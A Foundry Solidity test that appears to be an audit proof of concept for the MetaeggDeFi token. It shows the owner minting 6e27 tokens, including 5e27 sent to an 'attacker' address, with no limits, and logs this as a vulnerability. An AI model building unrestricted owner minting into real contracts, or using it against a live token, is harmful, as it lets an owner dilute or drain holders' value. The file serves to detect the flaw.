// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/MetaeggDeFi.sol";

contract MetaeggDeFiTest is Test {
    MetaeggDeFi token;
    address deployer = makeAddr("deployer");
    address attacker = makeAddr("attacker");

    // Initial state setup
    function setUp() public {
        vm.prank(deployer);
        token = new MetaeggDeFi();
    }

    function testUnlimitedMinting() public {
        // --- BEFORE-Trigger Mint Operations ---
        uint256 initialSupply = token.totalSupply();
        uint256 initialAttackerBalance = token.balanceOf(attacker);
        console.log("--- BEFORE ---");
        console.log("Initial token supply:", initialSupply);
        console.log("Attacker initial balance:", initialAttackerBalance);
        
        // Verify deployer is owner
        address owner = token.owner();
        assertEq(owner, deployer, "Deployer should be owner");
        
        // --- TRIGGER: First Mint (to owner) ---
        console.log("--- TRIGGER: mint(1e27) ---");
        vm.startPrank(deployer);
        token.mint(1e27);
        vm.stopPrank();
        
        // --- AFTER First Mint ---
        uint256 supplyAfterFirstMint = token.totalSupply();
        uint256 attackerBalanceAfterFirstMint = token.balanceOf(attacker);
        console.log("--- AFTER First Mint ---");
        console.log("Supply after first mint:", supplyAfterFirstMint);
        console.log("Attacker balance after first mint:", attackerBalanceAfterFirstMint);
        
        // Validate supply inflated by expected amount
        assertEq(
            supplyAfterFirstMint, 
            initialSupply + 1e27,
            "Minting should increase total supply"
        );
        
        // --- TRIGGER: Second Mint (to attacker) ---
        console.log("--- TRIGGER: mint(attacker, 5e27) ---");
        vm.prank(deployer);
        token.mint(attacker, 5e27);
        
        // --- AFTER Second Mint ---
        uint256 finalSupply = token.totalSupply();
        uint256 finalAttackerBalance = token.balanceOf(attacker);
        console.log("--- AFTER Second Mint ---");
        console.log("Final token supply:", finalSupply);
        console.log("Attacker final balance:", finalAttackerBalance);
        
        // Validate attacker received funds
        assertEq(finalAttackerBalance, 5e27, "Attacker should receive minted tokens");
        // Validate total inflation
        assertEq(
            finalSupply, 
            initialSupply + 6e27,
            "Supply should reflect both mints"
        );
        
        // --- Differential Validation ---
        uint256 totalSupplyIncrease = finalSupply - initialSupply;
        uint256 attackerBalanceIncrease = finalAttackerBalance - initialAttackerBalance;
        
        console.log("Total supply increase:", totalSupplyIncrease);
        console.log("Attack balance increase:", attackerBalanceIncrease);
        
        // Final vulnerability verdict
        if (totalSupplyIncrease == 6e27 && attackerBalanceIncrease == 5e27) {
            console.log("Vulnerability Exists: Owner was able to mint over 600% of initial supply without restrictions");
        } else {
            console.log("Vulnerability not Exist: Minting failed or produced unexpected results");
        }
    }
}